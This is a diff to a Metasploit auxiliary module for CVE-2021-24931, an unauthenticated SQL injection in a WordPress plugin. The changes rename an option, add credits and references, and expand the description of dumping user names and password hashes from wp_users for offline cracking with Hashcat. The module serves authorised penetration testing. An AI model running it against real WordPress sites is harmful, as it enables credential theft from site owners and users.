@@ -19,21 +19,28 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           Secure Copy Content Protection and Content Locking, a WordPress plugin,
           prior to 2.8.2 is affected by an unauthenticated SQL injection via the
-          'sccp_id[]' parameter.
+          `sccp_id[]` parameter.
+
+          Remote attackers can exploit this vulnerability to dump usernames and password hashes
+          from the`wp_users` table of the affected WordPress installation. These password hashes
+          can then be cracked offline using tools such as Hashcat to obtain valid login
+          credentials for the affected WordPress installation.
         },
         'Author' => [
           'h00die', # msf module
-          'Hacker5preme (Ron Jost)', # edb
+          'Hacker5preme (Ron Jost)', # edb PoC
+          'Krzysztof Zając (kazet)', # Original bug discovery and writeup
         ],
         'License' => MSF_LICENSE,
         'References' => [
           ['CVE', '2021-24931'],
           ['URL', 'https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24931/README.md'],
+          ['URL', 'https://kazet.cc/2022/02/03/fuzzing-wordpress-plugins.html'],
           ['EDB', '50733'],
           ['WPVDB', '1cd52d61-af75-43ed-9b99-b46c471c4231'],
         ],
         'Actions' => [
-          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }]
+          ['List Users', { 'Description' => 'Queries username, password hash for USER_COUNT users' }]
         ],
         'DefaultAction' => 'List Users',
         'DisclosureDate' => '2021-11-08',
@@ -45,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options [
-      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3])
+      OptInt.new('USER_COUNT', [true, 'Number of users to enumerate', 3])
     ]
   end
 
@@ -59,7 +66,6 @@ class MetasploitModule < Msf::Auxiliary
       return Msf::Exploit::CheckCode::Safe('Secure Copy Content Protection and Content Locking version not vulnerable')
     end
 
-    print_good('Vulnerable version of Secure Copy Content Protection and Content Locking detected')
     checkcode
   end
 
@@ -76,7 +82,7 @@ class MetasploitModule < Msf::Auxiliary
           'type' => 'json'
         }
       })
-      fail_with Failure::Unreachable, 'Connection failed' unless res
+      fail_with(Failure::Unreachable, 'Connection failed') unless res
     end
 
     unless @sqli.test_vulnerable
@@ -86,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     columns = ['user_login', 'user_pass']
 
     print_status('Enumerating Usernames and Password Hashes')
-    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])
+    data = @sqli.dump_table_fields('wp_users', columns, '', datastore['USER_COUNT'])
 
     table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)
     data.each do |user|
